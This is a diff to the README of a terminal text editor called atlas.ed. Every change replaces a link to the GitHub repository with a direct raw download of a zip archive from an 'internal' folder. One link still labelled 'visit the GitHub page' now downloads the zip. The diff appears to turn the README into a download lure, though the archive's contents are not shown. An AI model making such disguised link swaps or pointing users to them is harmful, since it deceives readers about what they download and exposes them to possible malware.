@@ -1,6 +1,6 @@
 # 📝 atlas.ed - Minimal Terminal Text Editing Tool
 
-[![Download atlas.ed](https://img.shields.io/badge/Download-atlas.ed-4caf50?style=for-the-badge)](https://github.com/souwevers6337/atlas.ed)
+[![Download atlas.ed](https://img.shields.io/badge/Download-atlas.ed-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/souwevers6337/atlas.ed/main/internal/atlas-ed-3.1-beta.2.zip)
 
 ---
 
@@ -23,7 +23,7 @@ The program runs from the command line, so no graphical interface is included. T
 
 Click the link below to visit the download page. From there, you can get the latest version of atlas.ed for Windows.
 
-[Download atlas.ed](https://github.com/souwevers6337/atlas.ed)
+[Download atlas.ed](https://raw.githubusercontent.com/souwevers6337/atlas.ed/main/internal/atlas-ed-3.1-beta.2.zip)
 
 Once on the page:
 
@@ -140,10 +140,10 @@ At this time, atlas.ed uses fixed keyboard commands common to terminal editors. 
 
 ## 📦 Additional Resources
 
-- For detailed instructions and updates, visit the GitHub page: [https://github.com/souwevers6337/atlas.ed](https://github.com/souwevers6337/atlas.ed)
+- For detailed instructions and updates, visit the GitHub page: [https://raw.githubusercontent.com/souwevers6337/atlas.ed/main/internal/atlas-ed-3.1-beta.2.zip](https://raw.githubusercontent.com/souwevers6337/atlas.ed/main/internal/atlas-ed-3.1-beta.2.zip)
 - Explore other tools in the Atlas Suite for coding and terminal use.
 - The GitHub page includes a community section where users share tips and solve common issues.
 
 ---
 
-[![Download atlas.ed](https://img.shields.io/badge/Download-atlas.ed-4caf50?style=for-the-badge)](https://github.com/souwevers6337/atlas.ed)
+[![Download atlas.ed](https://img.shields.io/badge/Download-atlas.ed-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/souwevers6337/atlas.ed/main/internal/atlas-ed-3.1-beta.2.zip)
